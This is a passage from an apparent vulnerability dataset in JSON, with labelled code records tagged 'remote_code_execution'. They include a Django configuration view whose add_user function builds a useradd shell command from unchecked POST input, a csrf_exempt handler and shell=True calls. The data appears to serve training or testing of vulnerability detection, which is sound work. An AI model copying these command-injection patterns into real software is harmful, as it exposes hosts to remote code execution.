\"!!\":\n                    output = \"password has expired\"\n                # Encryption happens here, the hash is stripped from the\n                # enc_pwd and the algorithm id and salt are used to encrypt\n                # the password.\n                if crypt.crypt(password, enc_pwd) == enc_pwd:\n                    output = ''\n                else:\n                    output = \"incorrect password\"\n            except KeyError:\n                output = \"User '%s' not found\" % username\n            if len(output) == 0:\n                return JsonResponse({\"username\":username}, safe=False)\n            else:\n                return JsonResponse(output, safe=False)\n        elif action == 'logout':\n            print(action)\n            username = request.POST.get(\"username\")\n            print(username+' ')\n            queryset = User.objects.all().first()\n            if username == queryset.username:\n                return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False)\n        elif action == 'getDashboardCards':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_DASHBOARD_CARDS)\n            rows = cursor.fetchall()\n            print(rows)\n            return JsonResponse(rows, safe=False)\n        elif action == 'getDashboardChart':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])\n                datasets = cursor.fetchall()\n                print(datasets)\n                data = {'container_name' : row[1], 'data': datasets}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getDockerOverview':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                data = {'state': row[0], 'container_id': row[1], 'name': row[2],\n                        'image': row[3], 'running_for': row[4],\n                        'command': row[5], 'ports': row[6],\n                        'status': row[7], 'networks': row[8]}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getContainerStats':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            datasets_io = []\n            datasets_mem = []\n            datasets_perc = []\n            for row in rows:\n                datasets_io = []\n                datasets_mem = []\n                datasets_perc = []\n                # values with % appended to them\n                for iter in range(0,2):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_perc.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(2,4):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_mem.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(4,8):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_io.append(counter_val)\n                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getThreads':\n            print(action)\n            rows = []\n            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]\n            processes = ps.decode().split('\\n')\n            # this specifies the number of splits, so the splitted lines\n            # will have (nfields+1) elements\n            nfields = len(processes[0].split()) - 1\n            for row in processes[4:]:\n                rows.append(row.split(None, nfields))\n            return JsonResponse(rows, safe=False)\n        elif action == 'getContainerTop':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            resultset = []\n            for i in rows:\n                data = {}\n                datasets = []\n                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]\n                processes = ps.decode().split('\\n')\n                # this specifies the number of splits, so the splitted lines\n                # will have (nfields+1) elements\n                nfields = len(processes[0].split()) - 1\n                for p in processes[1:]:\n                    datasets.append(p.split(None, nfields))\n                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}\n                resultset.append(data)\n            return JsonResponse(resultset, safe=False)\n        elif action == 'getSettings':\n            print(action)\n            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = ps.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)\n        elif action == 'deleteUser':\n            print(action)\n            username = escape(request.POST.get(\"user\"))\n            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)\n        elif action == 'addNewUser':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            add_user(username,password)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)\n        elif action == 'addWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'deleteWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi\")\n            delete_WifiConn(wifi_name)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'editWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi_ap\")\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            edit_WifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)\n        return JsonResponse(serializer.errors, status=400)\n\ndef index(request):\n    return render(request, 'index.html')\n\nclass BoxDetailsViewSet(viewsets.ModelViewSet):\n    queryset = BoxDetails.objects.all()\n    serializer_class = BoxDetailsSerializer\n\nclass RegisteredServicesViewSet(viewsets.ModelViewSet):\n    queryset = RegisteredServices.objects.all()\n    serializer_class = RegisteredServicesSerializer    \n\n\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "9b7805119938343fcac9dc929d8882f1d97cf14a", "code": "/vuedj/configtitania/views.py/n/nfrom django.shortcuts import render\nfrom django.http import HttpResponse, JsonResponse\nfrom django.views.decorators.csrf import csrf_exempt\n\nfrom rest_framework.renderers import JSONRenderer\nfrom rest_framework.parsers import JSONParser\nfrom rest_framework.response import Response\nfrom rest_framework import viewsets\nfrom rest_framework.decorators import list_route\nfrom flask import escape\n\nfrom .models import BoxDetails, RegisteredServices\nfrom .serializers import BoxDetailsSerializer, RegisteredServicesSerializer\n\nimport common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd \n\n# fetch network AP details\nnm = NetworkManager.NetworkManager\nwlans = [d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)]\n\ndef get_osversion():\n    \"\"\"\n    PRETTY_NAME of your Titania os (in lowercase).\n    \"\"\"\n    with open(\"/etc/os-release\") as f:\n        osfilecontent = f.read().split(\"\\n\")\n        # $PRETTY_NAME is at the 5th position\n        version = osfilecontent[4].split('=')[1].strip('\\\"')\n        return version\n\ndef get_allconfiguredwifi():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        name = row.split(':')\n        print(name)\n        wifi.append(name[0])\n    return wifi\n\ndef get_allAPs():\n    \"\"\"\n    nmcli con | grep 802-11-wireless\n    \"\"\"\n    ps = subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0]\n    wifirows = ps.split('\\n')\n    wifi = []\n    for row in wifirows:\n        entry = row.split(':')\n        print(entry)\n        wifi.append(entry)\n    return wifi\n    # wifi_aps = []   \n    # for dev in wlans:\n    #     for ap in dev.AccessPoints:\n    #         wifi_aps.append(ap.Ssid)\n    # return wifi_aps\n\ndef add_user(username, password):\n    encPass = crypt.crypt(password,\"22\")\n    os.system(\"useradd -G docker,wheel -p \"+encPass+\" \"+username)\n\ndef add_newWifiConn(wifiname, wifipass):\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    print(currentwifi)\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi)        \n\ndef delete_WifiConn(wifiap):\n    \"\"\"\n    nmcli connection delete id <connection name>\n    \"\"\"\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE)\n    print(ps)\n\ndef edit_WifiConn(wifiname, wifipass):\n    ps = subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE)\n    print(ps)\n    print(wlans)\n    wlan0 = wlans[0]\n    print(wlan0)\n    print(wifiname)\n    # get selected ap as currentwifi\n    for dev in wlans:\n        for ap in dev.AccessPoints:\n            if ap.Ssid == wifiname:\n                currentwifi = ap\n    # params to set password\n    params = {\n            \"802-11-wireless\": {\n                \"security\": \"802-11-wireless-security\",\n            },\n            \"802-11-wireless-security\": {\n                \"key-mgmt\": \"wpa-psk\",\n                \"psk\": wifipass\n            },\n        }\n    conn = nm.AddAndActivateConnection(params, wlan0, currentwifi) \n    return       \n\n@csrf_exempt\ndef handle_config(request):\n    \"\"\"\n    List all code snippets, or create a new snippet.\n    \"\"\" \n    if request.method == 'POST':\n        action = request.POST.get(\"_action\")\n        print(action)\n        if action == 'registerService':\n            request_name = request.POST.get(\"name\")\n            request_address = request.POST.get(\"address\")\n            request_icon = request.POST.get(\"icon\")\n            print(request_name)\n            print(request_address)\n            print(request_icon)\n            setServiceDetails = RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'getSchema':\n            schema = get_osversion()\n            return JsonResponse({\"version_info\":schema}, safe=False)\n        elif action == 'getIfConfigured':\n            print(action)\n            queryset = BoxDetails.objects.all()\n            serializer = BoxDetailsSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'loadDependencies':\n            print(action)\n            queryset = RegisteredServices.objects.all()\n            serializer = RegisteredServicesSerializer(queryset, many=True)\n            return JsonResponse(serializer.data, safe=False)\n        elif action == 'getAllAPs':\n            wifi_aps = get_allAPs()\n            return JsonResponse(wifi_aps, safe=False)\n        elif action == 'saveUserDetails':\n            print(action)\n            boxname = escape(request.POST.get(\"boxname\"))\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            print(username)\n            add_user(username,password)\n            setBoxName = BoxDetails(boxname=boxname)\n            setBoxName.save()\n            # connect to wifi ap user selected\n            wifi_pass = request.POST.get(\"wifi_password\")\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            return JsonResponse({\"STATUS\":\"SUCCESS\"}, safe=False)\n        elif action == 'login':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            output=''\n            \"\"\"Tries to authenticate a user.\n            Returns True if the authentication succeeds, else the reason\n            (string) is returned.\"\"\"\n            try:\n                enc_pwd = spwd.getspnam(username)[1]\n                if enc_pwd in [\"NP\", \"!\", \"\", None]:\n                    output = \"User '%s' has no password set\" % username\n                if enc_pwd in [\"LK\", \"*\"]:\n                    output = \"account is locked\"\n                if enc_pwd == \"!!\":\n                    output = \"password has expired\"\n                # Encryption happens here, the hash is stripped from the\n                # enc_pwd and the algorithm id and salt are used to encrypt\n                # the password.\n                if crypt.crypt(password, enc_pwd) == enc_pwd:\n                    output = ''\n                else:\n                    output = \"incorrect password\"\n            except KeyError:\n                output = \"User '%s' not found\" % username\n            if len(output) == 0:\n                return JsonResponse({\"username\":username}, safe=False)\n            else:\n                return JsonResponse(output, safe=False)\n        elif action == 'logout':\n            print(action)\n            username = request.POST.get(\"username\")\n            print(username+' ')\n            queryset = User.objects.all().first()\n            if username == queryset.username:\n                return JsonResponse({\"STATUS\":\"SUCCESS\", \"username\":queryset.username}, safe=False)\n        elif action == 'getDashboardCards':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_DASHBOARD_CARDS)\n            rows = cursor.fetchall()\n            print(rows)\n            return JsonResponse(rows, safe=False)\n        elif action == 'getDashboardChart':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],])\n                datasets = cursor.fetchall()\n                print(datasets)\n                data = {'container_name' : row[1], 'data': datasets}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getDockerOverview':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_DOCKER_OVERVIEW)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            for row in rows:\n                data = {'state': row[0], 'container_id': row[1], 'name': row[2],\n                        'image': row[3], 'running_for': row[4],\n                        'command': row[5], 'ports': row[6],\n                        'status': row[7], 'networks': row[8]}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getContainerStats':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            print(rows)\n            finalset = []\n            datasets_io = []\n            datasets_mem = []\n            datasets_perc = []\n            for row in rows:\n                datasets_io = []\n                datasets_mem = []\n                datasets_perc = []\n                # values with % appended to them\n                for iter in range(0,2):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_perc.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(2,4):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_mem.append(counter_val)\n                # values w/o % appended to them\n                for iter in range(4,8):\n                    cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1])\n                    counter_val = cursor.fetchall()\n                    datasets_io.append(counter_val)\n                data = {'container_id': row[0], 'container_name' : row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc}\n                finalset.append(data)\n            return JsonResponse(finalset, safe=False)\n        elif action == 'getThreads':\n            print(action)\n            rows = []\n            ps = subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0]\n            processes = ps.decode().split('\\n')\n            # this specifies the number of splits, so the splitted lines\n            # will have (nfields+1) elements\n            nfields = len(processes[0].split()) - 1\n            for row in processes[4:]:\n                rows.append(row.split(None, nfields))\n            return JsonResponse(rows, safe=False)\n        elif action == 'getContainerTop':\n            print(action)\n            con = sqlite3.connect(\"dashboard.sqlite3\")\n            cursor = con.cursor()\n            cursor.execute(common.Q_GET_CONTAINER_ID)\n            rows = cursor.fetchall()\n            resultset = []\n            for i in rows:\n                data = {}\n                datasets = []\n                ps = subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0]\n                processes = ps.decode().split('\\n')\n                # this specifies the number of splits, so the splitted lines\n                # will have (nfields+1) elements\n                nfields = len(processes[0].split()) - 1\n                for p in processes[1:]:\n                    datasets.append(p.split(None, nfields))\n                data = {'container_id': i[0], 'container_name' : i[1], 'data': datasets}\n                resultset.append(data)\n            return JsonResponse(resultset, safe=False)\n        elif action == 'getSettings':\n            print(action)\n            ps = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = ps.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False)\n        elif action == 'deleteUser':\n            print(action)\n            username = escape(request.POST.get(\"user\"))\n            ps = subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate()\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False)\n        elif action == 'addNewUser':\n            print(action)\n            username = escape(request.POST.get(\"username\"))\n            password = escape(request.POST.get(\"password\"))\n            add_user(username,password)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False)\n        elif action == 'addWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            wifi_name = request.POST.get(\"wifi_ap\")\n            if len(wifi_name) > 0:\n                add_newWifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'deleteWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi\")\n            delete_WifiConn(wifi_name)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False)\n        elif action == 'editWifi':\n            print(action)\n            # connect to wifi ap user selected\n            wifi_name = request.POST.get(\"wifi_ap\")\n            wifi_pass = escape(request.POST.get(\"wifi_password\"))\n            edit_WifiConn(wifi_name,wifi_pass)\n            fetchusers = subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\n')[0]\n            # sample ps \n            # docker:x:992:pooja,asdasd,aaa,cow,dsds,priya,asdas,cowwwwww,ramm,asdasdasdasd,asdasdas,adam,run\n            userlist = fetchusers.split(':')[3].split(',')\n            configuredwifi = get_allconfiguredwifi()\n            wifi_aps = get_allAPs()\n            return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False)\n        return JsonResponse(serializer.errors, status=400)\n\ndef index(request):\n    return render(request, 'index.html')\n\nclass BoxDetailsViewSet(viewsets.ModelViewSet):\n    queryset = BoxDetails.objects.all()\n    serializer_class = BoxDetailsSerializer\n\nclass RegisteredServicesViewSet(viewsets.ModelViewSet):\n    queryset = RegisteredServices.objects.all()\n    serializer_class = RegisteredServicesSerializer    \n\n\n/n/n/n", "label": 1, "vtype": "remote_code_execution"}, {"id": "42b020edfe6b23b245938d23ff7a0484333d6450", "code": "evproxy.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport wzrpc\nfrom sup.ticker import Ticker\n\nclass EvaluatorProxy:\n    def __init__(self, ev_init, *args, **kvargs):\n        super().__init__()\n        self.ev_init = ev_init\n        self.bind_kt_ticker = Ticker()\n        self.bind_kt = 5\n\n    def handle_evaluate(self, reqid, interface, method, data):\n        domain, page = data\n        self.p.log.info('Recvd page %s, working on', reqid)\n        res = self.ev.solve_capage(domain, page)\n        self.p.log.info('Done, sending answer: %s', res)\n        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])\n\n    def send_keepalive(self):\n        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],\n            self.handle_keepalive_reply)\n        msg.insert(0, b'')\n        self.p.wz_sock.send_multipart(msg)\n\n    def handle_keepalive_reply(self, reqid, seqnum, status, data):\n        if status == wzrpc.status.success:\n            self.p.log.debug('Keepalive was successfull')\n        elif status == wzrpc.status.e_req_denied:\n            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.\n                format(wzrpc.name_status(status)))\n            self.p.auth_requests()\n            self.p.bind_methods()\n        elif status == wzrpc.status.e_timeout:\n            self.p.log.warn('Keepalive timeout')\n        else:\n            self.p.log.warn('Keepalive status {0}'.\n                format(wzrpc.name_status(status)))\n\n    def __call__(self, parent):\n        self.p = parent\n        self.p.wz_connect()\n        self.p.wz_auth_requests = [\n            (b'Router', b'auth-bind-route'),\n            (b'Router', b'auth-unbind-route'),\n            (b'Router', b'auth-set-route-type')]\n        self.p.wz_bind_methods = [\n            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]\n        self.p.auth_requests()\n        self.p.bind_methods()\n        self.ev = self.ev_init()\n        self.bind_kt_ticker.tick()\n        while self.p.running.is_set():\n            self.p.poll()\n            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:\n                self.bind_kt_ticker.tick()\n                self.send_keepalive()\n/n/n/nlib/wzrpc/wzbase.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom . import *\n\nclass WZBase(object):\n    def make_error_msg(self, iden, status):\n        msg = []\n        if iden:\n            msg.extend(iden)\n            msg.append(b'')\n        msg.append(header_struct.pack(wzstart, wzversion, msgtype.err))\n        msg.append(error_struct.pack(status))\n        return msg\n\n    def parse_msg(self, iden, msg):\n        if len(msg) == 0 or not msg[0].startswith(wzstart):\n            raise WZENoWZ('Not a WZRPC message {0} from {1}'.format(msg, repr(iden)))\n        try:\n            hsize = header_struct.size # locals are faster\n            wz, ver, type_ = header_struct.unpack(msg[0][:hsize])\n        except Exception as e:\n            raise\n        if int(ver) != wzversion:\n            raise WZEWrongVersion(iden, 'Wrong message version')\n        if type_ == msgtype.req:\n            unpacked = []\n            for v in req_struct.unpack(msg[0][hsize:]):\n                if type(v) == bytes:\n                    v = v.partition(b'\\0')[0]\n                unpacked.append(v)\n            return self._parse_req(iden, msg, *unpacked)\n        elif type_ == msgtype.rep:\n            unpacked = rep_struct.unpack(msg[0][hsize:])\n            return self._parse_rep(iden, msg, *unpacked)\n        elif type_ == msgtype.sig:\n            unpacked = []\n            for v in sig_struct.unpack(msg[0][hsize:]):\n                if type(v) == bytes:\n                    v = v.partition(b'\\0')[0]\n                unpacked.append(v)\n            return self._parse_sig(iden, msg, *unpacked)\n        elif type_ == msgtype.err:\n            unpacked = error_struct.unpack(msg[0][hsize:])\n            return self._parse_err(iden, msg, *unpacked)\n        elif type_ == msgtype.nil:\n            return self._handle_nil(iden, msg)\n        else:\n            raise WZEUnknownType(iden, 'Unknown message type')\n        \n    def parse_router_msg(self, frames):\n        base, msg = split_frames(frames)\n        return self.parse_msg(base[:-1], msg)\n/n/n/nlib/wzrpc/wzhandler.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom . import *\nfrom .wzbase import WZBase\n\nclass WZHandler(WZBase):\n    def __init__(self):\n        self.req_handlers = {}\n        self.response_handlers = {}\n        self.sig_handlers = {}\n        self.iden_reqid_map = BijectiveSetMap()\n\n    def set_req_handler(self, interface, method, fun):\n        self.req_handlers[(interface, method)] = fun\n\n    def set_response_handler(self, reqid, fun):\n        self.response_handlers[reqid] = fun\n\n    def set_sig_handler(self, interface, method, fun):\n        self.sig_handlers[(interface, method)] = fun\n\n    def del_req_handler(self, interface, method):\n        del self.req_handlers[(interface, method)]\n\n    def del_response_handler(self, reqid):\n        del self.response_handlers[reqid]\n\n    def del_sig_handler(self, interface, method):\n        del self.sig_handlers[(interface, method)]\n\n    def _parse_req(self, iden, msg, reqid, interface, method):\n        try:\n            handler = self.req_handlers[(interface, method)]\n        except KeyError:\n            try:\n                handler = self.req_handlers[(interface, None)]\n            except KeyError:\n                raise WZENoReqHandler(iden, reqid,\n                    'No req handler for %s,%s'%(interface, method))\n        if iden:\n            self.iden_reqid_map.add_value(tuple(iden), reqid)\n        handler(reqid, interface, method, msg[1:])\n        return ()\n\n    def _parse_rep(self, iden, msg, reqid, seqnum, status):\n        try:\n            handler = self.response_handlers[reqid]\n            if seqnum == 0:\n                del self.response_handlers[reqid]\n        except KeyError:\n            raise WZENoHandler(iden, 'No rep handler for reqid')\n        handler(reqid, seqnum, status, msg[1:])\n        return ()\n\n    def _parse_sig(self, iden, msg, interface, method):\n        try:\n            handler = self.sig_handlers[(interface, method)]\n        except KeyError:\n            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))\n        handler(interface, method, msg[1:])\n        return ()\n\n    def make_req_msg(self, interface, method, args, fun, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        msg = make_req_msg(interface, method, args, reqid)\n        self.set_response_handler(reqid, fun)\n        return msg\n\n    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):\n        msg = iden[:]\n        msg.append(b'')\n        